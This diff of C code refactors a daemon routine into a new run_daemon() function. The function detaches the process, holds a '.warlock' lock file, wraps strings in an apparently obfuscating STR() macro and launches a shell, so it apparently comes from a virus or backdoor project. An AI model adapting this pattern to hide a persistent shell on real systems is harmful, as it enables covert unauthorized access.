@@ -280,14 +280,6 @@ static int attach_to_devnull(void)
 
 int	daemonize(void)
 {
-	/* check if already locked, 
-	 * if not locked: doesnt lock but instead continues 
-	 * else returns 0 */
-
-	int lock_fd = -1;
-	if (lock(&lock_fd, CLOSE_END) == 1) {
-		return 0;
-	}
 
 	pid_t	pid;
 
@@ -319,16 +311,34 @@ int	daemonize(void)
 	chdir(STR("/"));
 	umask(0);
 
+	return 2;
+}
+
+int run_daemon(void)
+{
+	/* check if already locked, 
+	 * if not locked: doesnt lock but instead continues 
+	 * else returns 0 */
+
+	int lock_fd = -1;
+
+	if (lock(&lock_fd, CLOSE_END) == 1)
+		return 0;
+
+	if (daemonize() != 2) {
+		return -1;
+	}
 
 	/* lock the file (.warlock) at this point */
 	if (lock(&lock_fd, NO_CLOSE_END) == 1) {
-		write(1, STR("already locked\n"), 15);
+		logger(STR("already locked\n"));
 		return 0;
 	}
 
-	//run(&lock_fd, g_envp);
 	run_shell(g_envp);
+
 	unlock(&lock_fd);
+
 	return 0;
 }
 
